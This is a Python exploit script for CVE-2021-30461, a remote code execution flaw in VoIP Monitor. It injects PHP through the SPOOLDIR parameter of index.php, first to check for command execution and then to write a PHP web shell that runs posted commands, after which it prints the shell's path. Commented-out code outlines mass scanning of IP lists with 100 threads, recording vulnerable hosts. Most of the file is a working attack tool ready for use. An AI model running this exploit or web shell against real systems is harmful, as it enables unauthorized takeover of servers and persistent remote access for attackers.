import argparse
from sys import argv,exit
import time
import random
import string
import requests
from concurrent.futures import thread

print("""
###############################################
#       CVE-2021-30461 : VOIP Monitor RCE     #
###############################################
""")

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Connection": "close"}


def get_target(ip):
    # hostname = args.host
    # path = args.path
    return ip+"/index.php"

# def set_tmp(args):
#     global headers
#     target = get_target(args)
#     n_data = {"SPOOLDIR": "/tmp", "recheck": "vulnmachines"}
#     set_totmp = requests.post(target, n_data, headers=headers)
#     print(f"[*] set /tmp {set_totmp}")


def checkVulnerability(ip):
    global headers
    target = get_target(ip)
    print(f"[+] Attacking {target}")
    testcmd = {"SPOOLDIR": "test\".system(id).\"", "recheck": "vulnmachines"}
    response_text = b"uid="
    try:
        testcmd_req = requests.post(target, testcmd, verify=False, headers=headers)
        if response_text in testcmd_req.content or 'uid=' in testcmd_req.text:
            print("[*] host is vulnerable")
            with open("success.txt",'a')as f:
                f.write(str(target)+"\n")
        else:
            print("[-] host is not vulnerable")
    except Exception as e:
        print(str(e))



def uploadshell(ip):
    global headers
    # hostname = args.host
    # path = args.path
    shell_path = ""
    shellfilename = str ( ''.join(random.choice(string.ascii_lowercase) for i in range(10)) )
    target = get_target(ip)
    rce_payload = {"SPOOLDIR": f"/tmp\".file_put_contents('{shellfilename}.php','<?php @system($_POST[\"a\"]);').\"", "recheck": "vulnmachines"}
    rce_req = requests.post(target, headers=headers, data=rce_payload)
    print(f"[*] uploading shell {rce_req.status_code}")
    shell_path = ip+"/"+shellfilename+".php"
    shell_check = requests.get(shell_path, headers=headers, params={'a':'id'})
    print("[*] RCE Check : "+shell_check.text)
    print("[*] Your Shell at: " + shell_path)


def main():
    # parser = argparse.ArgumentParser(description='VoIP Monitor all versions command execution')
    # parser.add_argument('-t','--host',help='Host', type=str)
    # parser.add_argument('-b', '--path',help='Path of the VoIP Monitor', type=str)
    # parser.add_argument('-f','--file',help='ip file', type=str)
    # args = parser.parse_args()
    #set_tmp(args)


    # pool = thread.ThreadPoolExecutor(max_workers=100)
    # with open(argv[1],'r')as f:
    #     for ips in f:
    #         ip = ips.strip()
    #         pool.submit(checkVulnerability,(ip))


    #set_tmp(args)
    ip = argv[1]
    uploadshell(ip)
    #set_tmp(args)



if __name__ == "__main__":
    main()